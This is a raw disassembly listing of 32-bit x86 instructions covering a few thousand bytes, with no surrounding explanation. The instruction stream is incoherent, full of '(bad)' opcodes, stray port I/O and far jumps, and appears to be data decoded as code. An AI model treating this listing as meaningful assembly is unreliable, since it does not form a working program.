  4340db:	mov    eax,0x7fd01470
  4340e0:	iret   
  4340e1:	ins    BYTE PTR es:[edi],dx
  4340e2:	fucomi st,st(2)
  4340e4:	cmp    DWORD PTR [ebx-0x766833a0],esi
  4340ea:	adc    BYTE PTR [ebx],ah
  4340ec:	call   0x89a0:0x3ccce682
  4340f3:	aam    0x15
  4340f5:	retf   
  4340f6:	add    al,0x15
  4340f8:	test   DWORD PTR [ecx],ebx
  4340fa:	adc    eax,0x7d9c7efe
  4340ff:	ins    DWORD PTR es:[edi],dx
  434100:	into   
  434101:	aad    0x10
  434103:	sbb    BYTE PTR [ecx+0x76],ch
  434106:	pop    ebp
  434107:	popa   
  434108:	and    eax,DWORD PTR [edx]
  43410a:	fmul   DWORD PTR [eax-0x72]
  43410d:	pop    ebx
  43410e:	cmc    
  43410f:	and    eax,0x371ff100
  434114:	dec    ebx
  434115:	xchg   esp,eax
  434116:	dec    ebp
  434117:	and    DWORD PTR [ebx+0x32c53485],ebx
  43411d:	out    dx,eax
  43411e:	push   esi
  43411f:	mov    eax,0xe066c637
  434124:	dec    ecx
  434125:	into   
  434126:	stc    
  434127:	dec    edi
  434128:	int    0x97
  43412a:	pusha  
  43412b:	aaa    
  43412c:	(bad)  
  43412d:	push   es
  43412e:	xchg   BYTE PTR [ebx-0x5909d932],bh
  434134:	dec    esi
  434135:	lea    ecx,[ecx-0x168274c6]
  43413b:	mov    ch,0xc3
  43413d:	test   esi,ebp
  43413f:	add    eax,0x4bb259af
  434144:	mov    DWORD PTR [edi+0x20],eax
  434147:	pop    ds
  434148:	jp     0x434137
  43414a:	call   0xdd44f724
  43414f:	call   0x8f96:0x7973321a
  434156:	iret   
  434157:	push   cs
  434158:	rol    BYTE PTR ds:0xfb6d7067,0x67
  43415f:	inc    ebp
  434160:	and    al,0xa8
  434162:	pop    ds
  434163:	fist   DWORD PTR [ebx-0x6897d3f2]
  434169:	neg    BYTE PTR [edx]
  43416b:	dec    esp
  43416c:	mov    BYTE PTR [ebx],cl
  43416e:	push   ecx
  43416f:	xor    al,0x48
  434171:	xchg   ebx,eax
  434172:	ret    
  434173:	repnz sbb ebx,DWORD PTR [esi]
  434176:	retf   0x1c8
  434179:	pop    edx
  43417a:	adc    ecx,DWORD PTR [edx]
  43417c:	dec    ecx
  43417d:	xor    cl,BYTE PTR ds:0x2aed89eb
  434183:	ds jge 0x4341d7
  434186:	into   
  434187:	adc    BYTE PTR [ebx],0x47
  43418a:	ret    0x91cb
  43418d:	add    ah,bl
  43418f:	fstp   DWORD PTR [ecx]
  434191:	stc    
  434192:	cmp    cl,BYTE PTR [ebx]
  434194:	mov    edi,edx
  434196:	loope  0x43415a
  434198:	pushf  
  434199:	sbb    al,0x62
  43419b:	out    0x86,al
  43419d:	add    ch,BYTE PTR [eax-0x20]
  4341a0:	ss cmp ch,ch
  4341a3:	pop    ss
  4341a4:	cdq    
  4341a5:	mov    al,ds:0xd230591f
  4341aa:	inc    eax
  4341ab:	xchg   edi,eax
  4341ac:	inc    esp
  4341ad:	cdq    
  4341ae:	inc    edi
  4341af:	stos   DWORD PTR es:[edi],eax
  4341b0:	neg    BYTE PTR [ecx+edi*1-0x2]
  4341b4:	push   esi
  4341b5:	mov    ds:0x902526a1,al
  4341ba:	stos   DWORD PTR es:[edi],eax
  4341bb:	ins    DWORD PTR es:[edi],dx
  4341bc:	int3   
  4341bd:	mov    ecx,0x4ebf1d60
  4341c2:	inc    ebp
  4341c3:	sub    BYTE PTR [ebx+eax*1-0xa],dh
  4341c7:	pop    esp
  4341c8:	dec    edi
  4341c9:	lahf   
  4341ca:	sbb    dl,al
  4341cc:	pop    ss
  4341cd:	ins    BYTE PTR es:[edi],dx
  4341ce:	pop    ds
  4341cf:	xchg   DWORD PTR [ecx+eax*8-0x6b638bc],ebx
  4341d6:	daa    
  4341d7:	inc    ecx
  4341d8:	pop    ebp
  4341d9:	(bad)  [ebp+0x6d]
  4341dc:	sub    esi,esp
  4341de:	dec    ecx
  4341df:	sbb    ebp,DWORD PTR [eax-0x76f73b2e]
  4341e5:	pop    ebx
  4341e6:	mov    eax,0xd9781da0
  4341eb:	bnd jmp 0x5c6f3ff3
  4341f1:	aas    
  4341f2:	sub    ebp,DWORD PTR [edx+0x60037342]
  4341f8:	or     DWORD PTR [edi-0x4c],edi
  4341fb:	cmp    al,0x30
  4341fd:	comiss xmm2,xmm7
  434200:	adc    ebx,DWORD PTR [eax+0x1d]
  434203:	inc    ebp
  434204:	mov    ebx,0x88f5ec60
  434209:	dec    ebx
  43420a:	push   cs
  43420b:	test   eax,0xe0b55ad1
  434210:	test   DWORD PTR [ebx+0x5a],ecx
  434213:	out    dx,eax
  434214:	cmp    eax,DWORD PTR [ebx+0x4075fbfd]
  43421a:	repnz or DWORD PTR [eax-0x12a96e6b],ecx
  434221:	shr    BYTE PTR [ecx-0x71fa12ff],cl
  434227:	ins    DWORD PTR es:[edi],dx
  434228:	sub    bh,BYTE PTR [ebx]
  43422a:	mov    ebp,0x60a76f1d
  43422f:	push   ebp
  434230:	bound  edx,QWORD PTR [ebp+0x70]
  434233:	dec    edx
  434234:	ins    DWORD PTR es:[edi],dx
  434235:	adc    eax,0x274c221
  43423a:	jmp    0x6997:0x9a7d9a46
  434241:	add    eax,0x3052336d
  434246:	pusha  
  434247:	push   ebp
  434248:	jle    0x434267
  43424a:	leave  
  43424b:	jnp    0x434272
  43424d:	shl    esp,cl
  43424f:	xchg   esi,eax
  434250:	mov    WORD PTR [edi],ds
  434252:	mov    al,0xdc
  434254:	sti    
  434255:	jno    0x434204
  434257:	fwait
  434258:	mov    eax,0xb3221c24
  43425d:	sti    
  43425e:	add    BYTE PTR [esi],0x94
  434261:	call   0x4aae:0x3e1d49f
  434268:	daa    
  434269:	add    esi,esi
  43426b:	add    cl,cl
  43426d:	cmp    al,0x7c
  43426f:	fidiv  WORD PTR [esi-0x25]
  434272:	outs   dx,BYTE PTR ds:[esi]
  434273:	shr    edi,1
  434275:	cmp    BYTE PTR [edi+0x4435e893],al
  43427b:	(bad)  
  43427c:	fld    QWORD PTR [ecx]
  43427e:	cmp    ch,BYTE PTR [edi+0x7410fcda]
  434284:	dec    ebp
  434285:	jo     0x4342a6
  434287:	mov    bh,BYTE PTR [esi]
  434289:	dec    edi
  43428a:	adc    DWORD PTR [esi-0x78],ebp
  43428d:	mov    eax,esi
  43428f:	or     DWORD PTR [ecx+0x14],eax
  434292:	leave  
  434293:	or     DWORD PTR [esi-0x19de71fe],ebp
  434299:	imul   esp,DWORD PTR [ebx],0x7a
  43429c:	test   DWORD PTR ds:0xe588f932,ebx
  4342a2:	out    0xcc,eax
  4342a4:	sub    ebp,DWORD PTR [edi+0x23c7d97]
  4342aa:	in     al,dx
  4342ab:	mov    dh,al
  4342ad:	mov    es,WORD PTR [ebx+0x1]
  4342b0:	inc    edx
  4342b1:	sahf   
  4342b2:	nop
  4342b3:	rcr    DWORD PTR [esi+0x2],cl
  4342b6:	fmul   QWORD PTR [ebx]
  4342b8:	repz imul eax,DWORD PTR [edi+ebx*1+0x47],0x3
  4342be:	lods   al,BYTE PTR ds:[esi]
  4342bf:	outs   dx,DWORD PTR ds:[esi]
  4342c0:	fistp  DWORD PTR ss:[eax+0x75]
  4342c4:	std    
  4342c5:	sub    eax,0x9aad3f7c
  4342ca:	les    edx,FWORD PTR [esp+esi*1+0x3ef518f6]
  4342d1:	not    DWORD PTR [ebx]
  4342d3:	xlat   BYTE PTR ds:[ebx]
  4342d4:	mov    ebx,0xd5f74cb
  4342d9:	xor    ecx,esi
  4342db:	aaa    
  4342dc:	aad    0x29
  4342de:	loope  0x4342b5
  4342e0:	mov    ecx,0x82b31a77
  4342e5:	add    eax,0x51ff5e9c
  4342ea:	xchg   ebp,eax
  4342eb:	rol    BYTE PTR [ebp-0x17],0x1f
  4342ef:	and    esi,DWORD PTR [ebx+0x99b3da]
  4342f5:	mov    cl,0xa1
  4342f7:	aam    0xc
  4342f9:	mov    edi,0xccc81e3f
  4342fe:	sbb    eax,0x8f8389db
  434303:	into   
  434304:	adc    BYTE PTR [edi],dl
  434306:	pop    ds
  434307:	push   0x9a07349
  43430c:	xchg   esp,eax
  43430d:	push   eax
  43430e:	add    BYTE PTR [ecx-0x2c],al
  434311:	pop    ds
  434312:	and    DWORD PTR [esi+0x2c8d6fc8],edi
  434318:	xchg   ecx,eax
  434319:	stos   DWORD PTR es:[edi],eax
  43431a:	pusha  
  43431b:	xchg   edi,eax
  43431c:	cmp    esp,edi
  43431e:	pop    ebp
  43431f:	xchg   BYTE PTR [edx],ch
  434321:	(bad)  
  434322:	in     eax,0xdc
  434324:	inc    ecx
  434325:	add    ebp,DWORD PTR [edi+eax*1]
  434328:	lahf   
  434329:	cli    
  43432a:	xchg   BYTE PTR [ebx-0x50],bh
  43432d:	push   edi
  43432e:	push   ds
  43432f:	inc    ebx
  434330:	ret    
  434331:	mov    BYTE PTR [ebx],cl
  434333:	arpl   WORD PTR [ebx+edx*2],bx
  434336:	cld    
  434337:	loope  0x434343
  434339:	cli    
  43433a:	leave  
  43433b:	(bad)  
  43433c:	pop    eax
  43433d:	sub    DWORD PTR [ebx-0x64],ecx
  434340:	cli    
  434341:	or     DWORD PTR [esp+ecx*1-0xc9f6a66],esp
  434348:	mov    dl,0x68
  43434a:	push   0xffffffd0
  43434c:	hlt    
  43434d:	pop    ebx
  43434e:	(bad)  
  434350:	mov    edx,0xe4453620
  434355:	clc    
  434356:	pop    esp
  434357:	and    DWORD PTR [eax+edx*4+0x6e],ebp
  43435b:	fcmovnu st,st(7)
  43435d:	dec    esp
  43435e:	xchg   ebx,eax
  43435f:	jne    0x43430a
  434361:	mov    ds:0x8d3462e9,eax
  434366:	fnsave ds:0x3c367f9a
  43436c:	mov    DWORD PTR [ecx+0x59],edx
  43436f:	sbb    BYTE PTR [edx+0x45df60ac],cl
  434375:	add    ah,bl
  434377:	sbb    ah,BYTE PTR [edx-0x742d24bc]
  43437d:	popa   
  43437e:	xor    esi,eax
  434380:	push   esp
  434381:	lock xor cl,BYTE PTR [edi]
  434384:	mov    al,0xe3
  434386:	std    
  434387:	add    al,0xc8
  434389:	jo     0x4343ec
  43438b:	cmc    
  43438c:	cld    
  43438d:	lods   eax,DWORD PTR ds:[esi]
  43438e:	fistp  QWORD PTR [ebx-0x2e]
  434391:	xor    BYTE PTR [eax],dl
  434393:	dec    ecx
  434394:	enter  0x4365,0xd4
  434398:	sahf   
  434399:	pop    edi
  43439a:	xchg   DWORD PTR [edx-0x565092d1],ebp
  4343a0:	mov    DWORD PTR [ecx],esp
  4343a2:	mov    ?,WORD PTR [esi+ecx*2+0x0]
  4343a6:	cld    
  4343a7:	xchg   esp,eax
  4343a8:	pop    eax
  4343a9:	cld    
  4343aa:	pop    ebp
  4343ab:	aam    0x5b
  4343ad:	mov    al,ds:0x7d6469fa
  4343b2:	mov    bh,BYTE PTR [eax-0x78]
  4343b5:	ja     0x4343ca
  4343b7:	int3   
  4343b8:	loope  0x434385
  4343ba:	into   
  4343bb:	pop    es
  4343bc:	hlt    
  4343bd:	stos   BYTE PTR es:[edi],al
  4343be:	fwait
  4343bf:	outs   dx,DWORD PTR ds:[esi]
  4343c0:	xchg   DWORD PTR [ebx],eax
  4343c2:	xor    ah,BYTE PTR [ebx]
  4343c4:	std    
  4343c5:	add    BYTE PTR [ebp+0x1f],bl
  4343c8:	push   ss
  4343c9:	inc    edx
  4343ca:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4343cc:	mov    BYTE PTR [ebx],ah
  4343ce:	jb     0x4343d8
  4343d0:	mov    WORD PTR [ebx],es
  4343d2:	jae    0x4343f3
  4343d4:	xchg   ebp,eax
  4343d5:	dec    eax
  4343d6:	call   0xb446644c
  4343db:	push   ebp
  4343dc:	icebp  
  4343dd:	popf   
  4343de:	jg     0x4343d7
  4343e0:	(bad)  
  4343e1:	cmc    
  4343e2:	mov    ebp,0x9fc107fa
  4343e7:	aad    0x3e
  4343e9:	or     dl,BYTE PTR [ebp-0x2b]
  4343ec:	pop    eax
  4343ed:	and    esp,ebx
  4343ef:	daa    
  4343f0:	push   ss
  4343f1:	push   0xd389b9e1
  4343f6:	or     eax,0xc52e4593
  4343fb:	ja     0x4343cc
  4343fd:	add    ch,BYTE PTR [esp+ebx*8]
  434400:	push   edx
  434401:	fldenv [esi+0x1f201fab]
  434407:	adc    eax,0x4f2e36eb
  43440c:	add    ebp,DWORD PTR [eax]
  43440e:	add    al,BYTE PTR [esi-0x54]
  434411:	and    bl,BYTE PTR [ecx-0x15]
  434414:	stos   DWORD PTR es:[edi],eax
  434415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434416:	cmp    eax,0xe44c889c
  43441b:	sar    DWORD PTR [ebx-0x5d],1
  43441e:	pop    ds
  43441f:	inc    edi
  434420:	dec    ebx
  434421:	cdq    
  434422:	sahf   
  434423:	mov    esp,0xd55afe14
  434428:	je     0x4343fd
  43442a:	imul   edi,ebp,0x3c
  43442d:	and    esi,edi
  43442f:	jg     0x43447e
  434431:	xor    edx,DWORD PTR [edx+ebp*2]
  434434:	mov    bl,ch
  434436:	xlat   BYTE PTR ds:[ebx]
  434437:	mov    bh,dh
  434439:	call   DWORD PTR [ecx]
  43443b:	adc    DWORD PTR [esi+eiz*1],esp
  43443e:	out    dx,al
  43443f:	mov    WORD PTR [ebx],cs
  434441:	push   ebx
  434442:	pop    edi
  434443:	add    cl,BYTE PTR [ebp-0x7625099f]
  434449:	imul   esp,DWORD PTR [ecx+0x4f],0xffffffbf
  43444d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43444e:	fimul  DWORD PTR [ebp-0x10]
  434451:	icebp  
  434452:	out    0xba,al
  434454:	sbb    ah,BYTE PTR [edi-0x4b]
  434457:	test   BYTE PTR [ecx],cl
  434459:	lods   eax,DWORD PTR ds:[esi]
  43445a:	mov    al,ds:0x1fce5060
  43445f:	mov    bh,0x9b
  434461:	gs push esi
  434463:	cmp    BYTE PTR [esi+0x7e],dl
  434466:	push   0x4602dff1
  43446b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43446c:	lahf   
  43446d:	mov    bh,0x8e
  43446f:	imul   edx,esi,0x85dd597a
  434475:	fsubrp st(0),st
  434477:	test   DWORD PTR [esi+0x53aae9a7],edi
  43447d:	(bad)  
  43447f:	xor    eax,0xd68008ba
  434484:	mov    eax,DWORD PTR cs:[ecx]
  434487:	fwait
  434488:	cmp    BYTE PTR [ebp-0x7a],ah
  43448b:	sbb    al,0xe4
  43448d:	aad    0x60
  43448f:	or     edi,edx
  434491:	add    al,0x44
  434493:	or     ch,BYTE PTR [edx]
  434495:	mov    al,ds:0xc092a63c
  43449a:	inc    esi
  43449b:	or     eax,0x2abbd288
  4344a0:	in     al,0xc2
  4344a2:	pop    ecx
  4344a3:	xchg   ebp,eax
  4344a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4344a5:	(bad)  
  4344a6:	pusha  
  4344a7:	hlt    
  4344a8:	outs   dx,BYTE PTR ds:[esi]
  4344a9:	mov    WORD PTR [ecx],ss
  4344ab:	stc    
  4344ac:	and    al,0x1
  4344ae:	sbb    al,0xd0
  4344b0:	push   edi
  4344b1:	or     bh,BYTE PTR [ecx-0x28]
  4344b4:	fcomip st,st(5)
  4344b6:	repnz (bad) 
  4344b8:	mov    DWORD PTR [ecx-0x1e],ecx
  4344bb:	retf   
  4344bc:	pop    edi
  4344bd:	jmp    0xf17e6e04
  4344c2:	mov    edi,0x5a58a295
  4344c7:	aam    0x55
  4344c9:	add    BYTE PTR [ebx-0x1b1a2fba],0xff
  4344d0:	mov    BYTE PTR [edi-0x2d],bh
  4344d3:	outs   dx,BYTE PTR ds:[esi]
  4344d4:	adc    ch,BYTE PTR [eax]
  4344d6:	add    edi,DWORD PTR ds:0xfdf60582
  4344dc:	mov    cl,bh
  4344de:	fwait
  4344df:	jl     0x43450e
  4344e1:	xchg   esi,eax
  4344e2:	pop    ds
  4344e3:	fbld   TBYTE PTR ds:0xba6a426f
  4344e9:	jp     0x434488
  4344eb:	aam    0x52
  4344ed:	loope  0x4344c3
  4344ef:	sbb    eax,0x48955069
  4344f4:	xchg   esi,eax
  4344f5:	xchg   DWORD PTR [ebp+0x484378bf],eax
  4344fb:	sbb    esi,esp
  4344fd:	add    esi,DWORD PTR [edi-0x29]
  434500:	inc    ebx
  434501:	xchg   ebp,eax
  434502:	cmp    al,0x15
  434504:	les    ebp,FWORD PTR [eax]
  434506:	and    eax,0x7f66f952
  43450b:	jno    0x434496
  43450d:	jae    0x43451b
  43450f:	(bad)  
  434510:	cmc    
  434511:	int    0xe0
  434513:	or     DWORD PTR ds:0x15a02e1c,ebp
  434519:	fld    DWORD PTR [edx]
  43451b:	sar    DWORD PTR [eax],1
  43451d:	popf   
  43451e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43451f:	push   es
  434520:	mov    BYTE PTR [ecx-0x1804ac2d],dl
  434526:	loope  0x43452a
  434528:	scas   al,BYTE PTR es:[edi]
  434529:	adc    al,0xde
  43452b:	pop    eax
  43452c:	jl     0x4344d3
  43452e:	enter  0x674,0xf6
  434532:	mov    ds:0x716e759f,al
  434537:	lds    esp,FWORD PTR [eax+0x64d36922]
  43453d:	dec    eax
  43453e:	pop    edi
  43453f:	adc    eax,0x148ca7ac
  434544:	push   cs
  434545:	add    eax,DWORD PTR [esi+edi*2+0x22]
  434549:	pop    edi
  43454a:	scas   al,BYTE PTR es:[edi]
  43454b:	push   ds
  43454c:	fild   QWORD PTR [edx-0x69cdba9e]
  434552:	into   
  434553:	ds inc esi
  434555:	jns    0x434525
  434557:	(bad)  
  434558:	adc    DWORD PTR [eax+0x22],esi
  43455b:	fldcw  WORD PTR [ecx+0x2]
  43455e:	ficom  WORD PTR [esi-0x7c]
  434561:	pop    ds
  434562:	pop    esp
  434563:	fiadd  DWORD PTR [eax-0x3e6ee1c6]
  434569:	jno    0x434519
  43456b:	neg    BYTE PTR [edx-0x2828f8f9]
  434571:	repz das 
  434573:	pop    ebx
  434574:	icebp  
  434575:	int3   
  434576:	mov    ah,0x4a
  434578:	mov    edi,esi
  43457a:	add    DWORD PTR [ebx],edx
  43457c:	xchg   esi,eax
  43457d:	mov    eax,ds:0x466a5090
  434582:	mov    bh,BYTE PTR [esi+eax*4+0x2]
  434586:	jbe    0x434606
  434588:	xor    BYTE PTR gs:[ecx],bh
  43458b:	or     bh,ch
  43458d:	int    0x1e
  43458f:	stos   BYTE PTR es:[edi],al
  434590:	cmp    eax,0x8965f944
  434595:	in     al,0xa0
  434597:	cmp    esp,ebx
  434599:	add    eax,0x70a51152
  43459e:	loopne 0x43455e
  4345a0:	into   
  4345a1:	enter  0xd364,0xbc
  4345a5:	add    BYTE PTR [eax],bl
  4345a7:	inc    esi
  4345a8:	push   ds
  4345a9:	shl    ch,cl
  4345ab:	out    dx,eax
  4345ac:	mov    bl,0x2
  4345ae:	and    dl,BYTE PTR [ecx-0x7b2ac3c5]
  4345b4:	inc    ebx
  4345b5:	xchg   esp,eax
  4345b6:	pop    ss
  4345b7:	pop    edx
  4345b8:	mov    ebp,esi
  4345ba:	cmp    eax,eax
  4345bc:	shr    BYTE PTR [eax+eiz*1],cl
  4345bf:	jnp    0x4345df
  4345c1:	add    ch,BYTE PTR [edx]
  4345c3:	mov    ebx,eax
  4345c5:	int    0xd7
  4345c7:	adc    ch,dh
  4345c9:	mov    ds:0xdfd53f1f,al
  4345ce:	inc    ebp
  4345cf:	clc    
  4345d0:	ret    0xfdba
  4345d3:	aam    0x9a
  4345d5:	cmp    al,0x6
  4345d7:	pop    esp
  4345d8:	sbb    edi,eax
  4345da:	les    ecx,FWORD PTR [edi]
  4345dc:	mov    BYTE PTR [edi-0x3b],cl
  4345df:	sysenter 
  4345e1:	(bad)  
  4345e2:	xchg   esp,eax
  4345e3:	mov    edi,0xeac4714c
  4345e8:	xchg   esp,eax
  4345e9:	adc    al,BYTE PTR [eax+0x46]
  4345ec:	or     al,dl
  4345ee:	adc    BYTE PTR [esi-0x7257f5b6],dl
  4345f4:	mov    edi,edi
  4345f6:	stos   BYTE PTR es:[edi],al
  4345f7:	jb     0x434587
  4345f9:	aad    0xb4
  4345fb:	loop   0x434623
  4345fd:	add    BYTE PTR [edx-0x54],bh
  434600:	xchg   ebx,eax
  434601:	dec    eax
  434602:	jne    0x434681
  434604:	out    dx,eax
  434605:	mov    ds:0x796cbd06,al
  43460a:	push   ds
  43460b:	add    eax,0xa19da73e
  434610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434611:	lea    edi,[edi-0x6ab0332b]
  434617:	bound  bx,DWORD PTR [ebp-0x13955160]
  43461e:	pop    ds
  43461f:	sar    DWORD PTR [esi],1
  434621:	pop    esi
  434622:	push   ebx
  434623:	pop    es
  434624:	mov    ds:0x27d49cc3,al
  434629:	mov    ch,0x53
  43462b:	cmp    BYTE PTR [ebx],al
  43462d:	adc    esp,esi
  43462f:	pop    ecx
  434630:	outs   dx,DWORD PTR ds:[esi]
  434631:	scas   al,BYTE PTR es:[edi]
  434632:	pop    bx
  434634:	jb     0x43468b
  434636:	xchg   ebp,eax
  434637:	loop   0x434646
  434639:	jecxz  0x4345c3
  43463b:	sbb    edi,esp
  43463d:	add    DWORD PTR [edx],edi
  43463f:	push   edx
  434640:	xor    eax,0x86eaf22
  434645:	mov    ebp,0x8d89a7ac
  43464a:	xor    bl,BYTE PTR [ecx+0x7c]
  43464d:	push   esp
  43464e:	jb     0x4345eb
  434650:	aam    0xd5
  434652:	cli    
  434653:	(bad)  
  434654:	dec    ebx
  434655:	mov    dl,0xce
  434657:	hlt    
  434658:	mov    esi,0xf5fc7256
  43465d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43465e:	pop    ds
  43465f:	jne    0x4346c7
  434661:	(bad)  
  434662:	sbb    eax,0x9aecd87a
  434667:	stos   BYTE PTR es:[edi],al
  434668:	mov    DWORD PTR [esi+0x6243baf1],ebx
  43466e:	dec    edx
  43466f:	mov    edi,eax
  434671:	mov    esi,0x7ff6e50c
  434676:	dec    ebp
  434677:	aam    0x79
  434679:	mov    ebp,0xa98e1c8e
  43467e:	in     eax,0xd5
  434680:	rol    BYTE PTR [ebp+0x14],0xf8
  434684:	stos   BYTE PTR es:[edi],al
  434685:	cmp    eax,edi
  434687:	lahf   
  434688:	mov    ds,ebx
  43468a:	sub    edi,0x940944a7
  434690:	dec    esi
  434691:	sbb    al,0xfa
  434693:	(bad)  
  434694:	(bad)  
  434695:	sbb    DWORD PTR [ebx-0x2f77fba0],edi
  43469b:	add    eax,0x724e5b6b
  4346a0:	dec    ecx
  4346a1:	jmp    0x434703
  4346a3:	arpl   WORD PTR [edx-0x2f2afaf8],cx
  4346a9:	xchg   ecx,eax
  4346aa:	adc    eax,0x756f0898
  4346af:	stos   DWORD PTR es:[edi],eax
  4346b0:	pop    ebx
  4346b1:	lea    edi,[edi+0x3ace1695]
  4346b7:	retf   
  4346b8:	and    BYTE PTR [ecx-0x52],0xfa
  4346bc:	lahf   
  4346bd:	mov    dl,0x9f
  4346bf:	cs aaa 
  4346c1:	mov    ebp,0x30ecd6f
  4346c6:	mov    ss,WORD PTR [ebp-0x4034a097]
  4346cc:	(bad)  
  4346cd:	(bad)  
  4346ce:	pusha  
  4346cf:	cmp    ecx,ebx
  4346d1:	push   ecx
  4346d2:	nop
  4346d3:	mov    bh,0xb6
  4346d5:	xchg   edx,eax
  4346d6:	enter  0x7ef4,0x2
  4346da:	xor    BYTE PTR ds:0xba898e42,ah
  4346e0:	shl    bh,0x46
  4346e3:	pop    ds
  4346e4:	xor    BYTE PTR [edx+0x15],cl
  4346e7:	lahf   
  4346e8:	mov    WORD PTR [edx],es
  4346ea:	dec    ebp
  4346eb:	push   0x58b1f897
  4346f0:	mov    dh,bl
  4346f2:	xchg   ecx,eax
  4346f3:	stos   DWORD PTR es:[edi],eax
  4346f4:	jge    0x4346eb
  4346f6:	lods   al,BYTE PTR ds:[esi]
  4346f8:	and    ecx,DWORD PTR [ebx-0x41]
  4346fb:	xchg   ecx,eax
  4346fc:	je     0x434709
  4346fe:	fdiv   DWORD PTR [ecx-0x2b681590]
  434704:	cmc    
  434705:	fidivr DWORD PTR [ebp-0x653813b8]
  43470b:	jae    0x434735
  43470d:	sbb    al,0xd7
  43470f:	mov    esp,0x61af298
  434714:	mov    DWORD PTR [esi+ebx*2],esp
  434717:	in     eax,0xb6
  434719:	add    eax,0x26425878
  43471e:	mov    eax,0x1f43492d
  434723:	mov    ds:0x342336b9,eax
  434728:	mov    edx,0xb2aad8a8
  43472d:	push   edx
  43472e:	or     al,0xd
  434730:	jnp    0x4346d5
  434732:	lahf   
  434733:	mov    edi,0x41efbc3c
  434738:	not    DWORD PTR [edi]
  43473a:	bound  edi,QWORD PTR [ecx]
  43473c:	cdq    
  43473d:	or     ebp,DWORD PTR [ebp-0x44]
  434740:	jmp    0x6877b8cd
  434745:	add    edx,eax
  434747:	jmp    0xa6db:0xe8958e21
  43474e:	pusha  
  43474f:	xlat   BYTE PTR ds:[ebx]
  434750:	aam    0x76
  434752:	sar    BYTE PTR [edi],cl
  434754:	sub    BYTE PTR [ecx],ah
  434756:	outs   dx,BYTE PTR ds:[esi]
  434757:	aad    0x62
  434759:	sbb    bl,BYTE PTR [esi+0x4e570c4f]
  43475f:	and    cl,BYTE PTR [eax+0x2af4d275]
  434765:	leave  
  434766:	sbb    eax,DWORD PTR [ecx]
  434768:	sbb    eax,DWORD PTR [ebx]
  43476a:	push   es
  43476b:	rol    DWORD PTR [esp+esi*4-0x4d],cl
  43476f:	and    al,0xd2
  434771:	jmp    0x211f:0x78464b45
  434778:	fisttp QWORD PTR [ebp-0x56]
  43477b:	inc    edx
  43477c:	cmp    edx,DWORD PTR [edi+0x24]
  43477f:	js     0x434791
  434781:	push   edi
  434782:	fcmovbe st,st(4)
  434784:	imul   esi,DWORD PTR [ebx-0x5b2e451a],0x60
  43478b:	fwait
  43478c:	sbb    eax,0xfe764b67
  434791:	inc    edx
  434792:	adc    ah,0x2f
  434795:	retf   
  434796:	iret   
  434797:	pop    es
  434798:	mov    ch,0xd1
  43479a:	mov    ecx,0xe65bf92f
  43479f:	aam    0x0
  4347a1:	(bad)  
  4347a2:	leave  
  4347a3:	sbb    esi,DWORD PTR [eax]
  4347a5:	outs   dx,DWORD PTR ds:[esi]
  4347a6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4347a8:	ds push eax
  4347aa:	jmp    0x15e6b69f
  4347af:	retf   0x8e08
  4347b2:	jge    0x434747
  4347b4:	cli    
  4347b5:	jbe    0x434836
  4347b7:	jmp    0x434746
  4347b9:	fidivr WORD PTR es:0xd57ef81c
  4347c0:	and    cl,bl
  4347c2:	in     al,dx
  4347c3:	xor    BYTE PTR [ecx],dh
  4347c5:	cmp    BYTE PTR [edi-0x63],bl
  4347c8:	mov    DWORD PTR [ebx],ebp
  4347ca:	(bad)  
  4347cb:	in     eax,dx
  4347cc:	test   eax,0x9a445eb4
  4347d1:	add    eax,0x3e4bb0b6
  4347d6:	icebp  
  4347d7:	and    eax,edi
  4347d9:	cmp    ebx,DWORD PTR [esi]
  4347db:	popa   
  4347dc:	rcr    ecx,cl
  4347de:	mov    dl,BYTE PTR [ebx+0x69]
  4347e1:	sub    BYTE PTR [esi+0x20],bl
  4347e4:	dec    eax
  4347e5:	jb     0x434858
  4347e7:	aam    0xc4
  4347e9:	jmp    0x4347d3
  4347eb:	sbb    eax,0xd44c173e
  4347f0:	adc    esp,DWORD PTR [edx+0x6f956a67]
  4347f6:	push   esp
  4347f7:	je     0x434781
  4347f9:	in     eax,dx
  4347fa:	fldenv [edx]
  4347fc:	mov    edx,0x809cafb7
  434801:	pop    ss
  434802:	and    al,0x4c
  434804:	scas   eax,DWORD PTR es:[edi]
  434805:	fisttp DWORD PTR [ecx-0x6c]
  434808:	jnp    0x43484a
  43480a:	push   0xad3f89e2
  43480f:	sbb    al,0xb2
  434811:	loope  0x434816
  434813:	out    0xc5,eax
  434815:	add    dh,BYTE PTR [edi+ecx*2-0x2c1543e9]
  43481c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43481d:	out    0x66,al
  43481f:	in     eax,dx
  434820:	lock sbb ebp,edi
  434823:	and    bh,bl
  434825:	push   edx
  434826:	sub    eax,0xfd053aac
  43482b:	aam    0x2e
  43482d:	cmp    DWORD PTR [esi+0x55],edx
  434830:	mov    edx,ds
  434832:	ror    ecx,0x63
  434835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434836:	data16 aas 
  434838:	mov    eax,0x96d0a423
  43483d:	xchg   edx,eax
  43483e:	les    esp,FWORD PTR [edx]
  434840:	popf   
  434841:	mov    DWORD PTR [ecx+0x66],eax
  434844:	mov    dh,0xe2
  434846:	add    al,0xf8
  434848:	xor    al,BYTE PTR [ebx]
  43484a:	(bad)  
  43484b:	cdq    
  43484c:	cmp    dl,0xd1
  43484f:	dec    ebx
  434850:	lea    ebp,[ebp+0x4df8bfa3]
  434856:	test   DWORD PTR ds:0xd4382fd4,edx
  43485c:	rcl    BYTE PTR [edi-0x12],1
  43485f:	push   ds
  434860:	push   ebx
  434861:	out    0xff,eax
  434863:	dec    ebx
  434864:	adc    BYTE PTR [esi-0x6d],bh
  434867:	stos   BYTE PTR es:[edi],al
  434868:	loope  0x434888
  43486a:	mov    edi,0xba860891
  43486f:	es dec ebx
  434871:	add    ch,BYTE PTR [eax-0x21a63312]
  434877:	ins    BYTE PTR es:[edi],dx
  434878:	fwait
  434879:	adc    al,0x56
